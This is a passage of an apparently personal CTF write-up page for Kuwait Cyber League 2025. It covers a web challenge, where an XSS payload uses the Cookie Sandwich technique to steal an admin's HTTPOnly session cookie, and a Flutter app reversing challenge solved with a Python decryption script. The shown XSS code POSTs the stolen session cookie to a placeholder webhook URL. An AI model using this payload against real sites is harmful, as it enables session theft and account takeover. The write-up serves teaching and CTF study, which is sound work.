+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">stolen_session</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">sessionCookie</span>, <span style="color:#a6e22e">full_lang_value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">langValue</span> })
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;WEBHOOK_URL&#39;</span>,{
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span>{<span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;application/json&#39;</span>},
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span><span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({ <span style="color:#a6e22e">error</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">toString</span>() })
+</span></span><span style="display:flex;"><span>        });
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})();
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
+</span></span></code></pre></div><h3 id="exploitation-steps">Exploitation Steps</h3>
+<ol>
+<li>Login as regular user</li>
+<li>Create note with XSS payload</li>
+<li>Report note to admin bot</li>
+<li>Bot executes XSS, performs Cookie Sandwich attack</li>
+<li>Receive stolen session cookie via webhook</li>
+<li>Use stolen session from our IP to access <code>/admin/flag</code></li>
+<li>Retrieve flag!</li>
+</ol>
+<h2 id="conclusion">Conclusion</h2>
+<p>This challenge demonstrated that <strong>HTTPOnly cookies are NOT immune to theft</strong> when:</p>
+<ul>
+<li>Cookie values are reflected in page content</li>
+<li>Server&rsquo;s cookie parser handles quoted values according to RFC2109</li>
+<li>Cookie ordering can be manipulated via path attributes</li>
+<li>An XSS vulnerability exists to execute the attack</li>
+</ul>
+<p>The Cookie Sandwich technique is a sophisticated attack that exploits subtle differences between how browsers send cookies and how servers parse them. It serves as a reminder that defense-in-depth is essential - relying solely on HTTPOnly flags is insufficient when other vulnerabilities exist.</p>
+<h2 id="references">References</h2>
+<ol>
+<li><a href="https://portswigger.net/research/stealing-httponly-cookies-with-the-cookie-sandwich-technique">PortSwigger Research</a></li>
+<li><a href="https://medium.com/@mysticraganork66/heres-the-polished-write-up-of-the-cookie-sandwich-technique-a3d921c8aa23">Medium Article by 0verlo0ked</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc2109">RFC 2109 - HTTP State Management Mechanism</a></li>
+</ol>
+<hr>
+<h1 id="clutter-mobile-security-challenge---hard">Clutter Mobile Security Challenge - Hard</h1>
+<p>Sadly due to time constraints I was not able to complete this challenge during the CTF, however I managed to solve it later on my own time. Below is the writeup for this challenge.</p>
+<h2 id="challenge-overview-1">Challenge Overview</h2>
+<p>This challenge ships an Android Flutter application (<code>Clutter</code>) together with an encrypted flag that was base64‑encoded after encryption. Our goal is to reverse the app, understand how it derives its encryption keys, and reproduce the exact process offline to recover the plaintext flag. <a href="https://blog.looter.dev/downloads/clutter-hard.zip">download link</a></p>
+<h2 id="key-takeaways">Key takeaways:</h2>
+<ul>
+<li>The app is a Flutter build; the compiled Dart code sits inside <code>libapp.so</code>.</li>
+<li><code>Secret.getSecret</code> performs <strong>10 000 rounds of SHA-256</strong> on a seed string and returns the final hex digest.</li>
+<li><code>Secret.encrypt</code> slices the digest (as ASCII) into an AES-256 key and 128-bit IV, then <strong>encrypts with AES-CBC + PKCS7</strong>.</li>
+<li>The seed is the six-digit TOTP generated by <code>_TOTPVerificationPageState::_verifyTOTP</code>.</li>
+<li>The TOTP is deterministic: it uses the hard-coded timestamp <code>1999-10-20T09:00:00Z</code>, the fixed Base32 secret <code>ORUGS427NFZV63TPORPXI2DFL5TGYYLHL52XO5K7</code>, HMAC-SHA256, and a 30 s step.</li>
+</ul>
+<p>Once we mirror that logic, decrypting the provided ciphertext recovers the flag.</p>
+<h2 id="tooling">Tooling</h2>
+<ul>
+<li><a href="https://apktool.org">apktool</a> - unpack the APK and extract <code>libapp.so</code>.</li>
+<li><a href="https://github.com/worawit/blutter">blutter</a> - disassembled Dart VM IR and object pool dumps.</li>
+<li>python with cryptography package.</li>
+<li>Custom Python solver (below) to re-create the secret derivation pipeline and decrypt the ciphertext.</li>
+</ul>
+<h2 id="stage-1---code-reconnaissance">Stage 1 - Code Reconnaissance</h2>
+<ol>
+<li>By Inspecting <code>decompiled.flutter/asm/clutter/secret.dart</code> we notes the following:
+<ul>
+<li><code>Secret.encrypt</code> grabs the first 64 characters of the 10 000-round SHA-256 digest as the AES key and the first 32 characters for the IV.</li>
+<li>It passes those substrings to <code>Encrypted.fromUtf8</code>, meaning the encrypt library interprets them as UTF-8 bytes, not hex.</li>
+</ul>
+</li>
+<li><code>Secret.getSecret</code> loops 10 000 times:
+<pre tabindex="0"><code>s_0 = seed
+s_{i+1} = sha256(s_i.encode()).hexdigest()
+</code></pre>returning the final hex string.</li>
+<li><code>_EncryptionPageState::_encryptMessage</code> forwards <strong>only</strong> the verified TOTP code into <code>Secret.encrypt</code>; the user’s message is supplied separately as plaintext input.</li>
+</ol>
+<h2 id="stage-2---rebuilding-the-totp-derivation">Stage 2 - Rebuilding the TOTP Derivation</h2>
+<p>From <code>decompiled.flutter/asm/clutter/main.dart</code>, focusing on <code>_TOTPVerificationPageState::_verifyTOTP</code>:</p>
+<ol>
+<li>The page controller initially holds a fixed string. When verification starts:
+<ul>
+<li>Parse the string using <code>DateTime.parse</code>.</li>
+<li>Call <code>initializeTimeZones</code> and <code>getLocation</code> to load <code>America/Los_Angeles</code>.</li>
+<li>Build a <code>TZDateTime</code> in that zone, then fetch <code>millisecondsSinceEpoch</code>.</li>
+<li>Call <code>OTP.generateTOTPCodeString(milliseconds, secret, ...)</code>.</li>
+</ul>
+</li>
+<li>The object pool (<code>pp.txt</code>) reveals the constants:
+<ul>
+<li>Timestamp literal: <code>&quot;1999-10-20T09:00:00Z&quot;</code>.</li>
+<li>Base32 secret: <code>&quot;ORUGS427NFZV63TPORPXI2DFL5TGYYLHL52XO5K7&quot;</code>.</li>
+</ul>
+</li>
+<li>Inspecting <code>otp/otp.dart</code> shows the app uses <strong>HMAC-SHA256</strong> (<code>Instance__Sha256</code>) with a 30-second step and produces 6 digits.</li>
+</ol>
+<p>Therefore the seed fed into <code>Secret.getSecret</code> is the string <code>213947</code> generated from that timestamp.</p>
+<p>Reproducing it in Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64<span style="color:#f92672">,</span> hashlib<span style="color:#f92672">,</span> hmac<span style="color:#f92672">,</span> struct<span style="color:#f92672">,</span> datetime<span style="color:#f92672">,</span> pytz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>secret_b32 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ORUGS427NFZV63TPORPXI2DFL5TGYYLHL52XO5K7&#39;</span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b32decode(secret_b32, casefold<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>instant <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>fromisoformat(<span style="color:#e6db74">&#39;1999-10-20T09:00:00+00:00&#39;</span>)
+</span></span><span style="display:flex;"><span>la <span style="color:#f92672">=</span> pytz<span style="color:#f92672">.</span>timezone(<span style="color:#e6db74">&#39;America/Los_Angeles&#39;</span>)
+</span></span><span style="display:flex;"><span>local_instant <span style="color:#f92672">=</span> instant<span style="color:#f92672">.</span>astimezone(la)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>counter <span style="color:#f92672">=</span> int(local_instant<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">30</span>  <span style="color:#75715e"># seconds / 30</span>
+</span></span><span style="display:flex;"><span>msg <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&gt;Q&#39;</span>, counter)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>digest <span style="color:#f92672">=</span> hmac<span style="color:#f92672">.</span>new(key, msg, hashlib<span style="color:#f92672">.</span>sha256)<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> digest[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x0F</span>
+</span></span><span style="display:flex;"><span>code <span style="color:#f92672">=</span> (struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;&gt;I&#39;</span>, digest[offset:offset<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7FFFFFFF</span>) <span style="color:#f92672">%</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Based on the TOTP derivation, the seed is: </span><span style="color:#e6db74">{</span>code<span style="color:#e6db74">:</span><span style="color:#e6db74">06d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>code<span style="color:#e6db74">:</span><span style="color:#e6db74">06d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;213947&#34;</span>
+</span></span></code></pre></div><h2 id="stage-3---deriving-the-aes-keyiv-and-decrypting">Stage 3 - Deriving the AES Key/IV and Decrypting</h2>
+<ol>
+<li>Start from seed <code>&quot;213947&quot;</code>.</li>
+<li>Loop 10 000 times: <code>s = sha256(s.encode()).hexdigest()</code>. After the final iteration:
+<pre tabindex="0"><code>cd270ea25a26fdbb468afda746fda5e3798810f52e7d278bd5488892058df950
+</code></pre></li>
+<li>The encrypt package uses the <strong>ASCII bytes</strong> of the substrings:
+<ul>
+<li>Key = first 32 characters → <code>cd270ea25a26fdbb468afda746fda5e3</code> (32 ASCII bytes → 256 bits).</li>
+<li>IV = first 16 characters → <code>&quot;cd270ea25a26fdbb&quot;</code> (16 ASCII bytes → 128 bits).</li>
+</ul>
+</li>
+<li>Decrypt the base64-decoded ciphertext with AES-CBC/PKCS7.</li>
+</ol>
+<hr>
+<h2 id="solver-script">Solver Script</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> datetime
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> hmac
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pytz
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives.ciphers <span style="color:#f92672">import</span> Cipher, algorithms, modes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.hazmat.primitives <span style="color:#f92672">import</span> padding
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">generate_totp</span>(timestamp: str, secret_b32: str) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b32decode(secret_b32, casefold<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>    instant <span style="color:#f92672">=</span> datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>fromisoformat(timestamp<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;Z&#34;</span>, <span style="color:#e6db74">&#34;+00:00&#34;</span>))
+</span></span><span style="display:flex;"><span>    la <span style="color:#f92672">=</span> pytz<span style="color:#f92672">.</span>timezone(<span style="color:#e6db74">&#34;America/Los_Angeles&#34;</span>)
+</span></span><span style="display:flex;"><span>    counter <span style="color:#f92672">=</span> int(instant<span style="color:#f92672">.</span>astimezone(la)<span style="color:#f92672">.</span>timestamp()) <span style="color:#f92672">//</span> <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&gt;Q&#34;</span>, counter)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    digest <span style="color:#f92672">=</span> hmac<span style="color:#f92672">.</span>new(key, msg, hashlib<span style="color:#f92672">.</span>sha256)<span style="color:#f92672">.</span>digest()
+</span></span><span style="display:flex;"><span>    offset <span style="color:#f92672">=</span> digest[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x0F</span>
+</span></span><span style="display:flex;"><span>    code <span style="color:#f92672">=</span> (struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&gt;I&#34;</span>, digest[offset:offset <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>])[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x7FFFFFFF</span>) <span style="color:#f92672">%</span> (<span style="color:#ae81ff">10</span> <span style="color:#f92672">**</span> <span style="color:#ae81ff">6</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>code<span style="color:#e6db74">:</span><span style="color:#e6db74">06d</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">derive_digest</span>(seed: str, rounds: int <span style="color:#f92672">=</span> <span style="color:#ae81ff">10_000</span>) <span style="color:#f92672">-&gt;</span> str:
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> seed
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(rounds):
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha256(s<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>hexdigest()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt_flag</span>(cipher_b64: str) <span style="color:#f92672">-&gt;</span> bytes:
+</span></span><span style="display:flex;"><span>    timestamp <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1999-10-20T09:00:00Z&#34;</span>
+</span></span><span style="display:flex;"><span>    secret_b32 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;ORUGS427NFZV63TPORPXI2DFL5TGYYLHL52XO5K7&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    otp <span style="color:#f92672">=</span> generate_totp(timestamp, secret_b32)
+</span></span><span style="display:flex;"><span>    digest <span style="color:#f92672">=</span> derive_digest(otp)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    key <span style="color:#f92672">=</span> digest[:<span style="color:#ae81ff">32</span>]<span style="color:#f92672">.</span>encode()  <span style="color:#75715e"># ASCII, not hex → 256-bit key</span>
+</span></span><span style="display:flex;"><span>    iv <span style="color:#f92672">=</span> digest[:<span style="color:#ae81ff">16</span>]<span style="color:#f92672">.</span>encode()   <span style="color:#75715e"># ASCII → 128-bit IV</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cipher <span style="color:#f92672">=</span> Cipher(algorithms<span style="color:#f92672">.</span>AES(key), modes<span style="color:#f92672">.</span>CBC(iv))
+</span></span><span style="display:flex;"><span>    decryptor <span style="color:#f92672">=</span> cipher<span style="color:#f92672">.</span>decryptor()
+</span></span><span style="display:flex;"><span>    padded <span style="color:#f92672">=</span> decryptor<span style="color:#f92672">.</span>update(base64<span style="color:#f92672">.</span>b64decode(cipher_b64)) <span style="color:#f92672">+</span> decryptor<span style="color:#f92672">.</span>finalize()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    unpadder <span style="color:#f92672">=</span> padding<span style="color:#f92672">.</span>PKCS7(<span style="color:#ae81ff">128</span>)<span style="color:#f92672">.</span>unpadder()
+</span></span><span style="display:flex;"><span>    plaintext <span style="color:#f92672">=</span> unpadder<span style="color:#f92672">.</span>update(padded) <span style="color:#f92672">+</span> unpadder<span style="color:#f92672">.</span>finalize()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> plaintext
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;encrypted.flag.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    ciphertext_b64 <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;The flag is:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>decrypt_flag(ciphertext_b64)<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Running the script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python solver.py
+</span></span><span style="display:flex;"><span>The flag is:
+</span></span><span style="display:flex;"><span>flag<span style="color:#f92672">{</span>clu773r_blu773r_wh47_d035_7h47_3v3n_m34n????<span style="color:#f92672">}</span>
+</span></span></code></pre></div><hr>
+<p>This concludes the writeup for the <code>Bottle</code> web challenge and the <code>Clutter</code> mobile security challenge from the Kuwait Cyber League CTF 2025. The other challenges were easy enough that I did not document them in detail. Overall, it was a fun and educational experience! If there is a demand, I may write up the other challenges later.</p>
+
+</content>
+
+
+
+<p>
+  
+</p>
+
+  </main>
+  <footer></footer>
+
+  
+</body>
+
+</html>
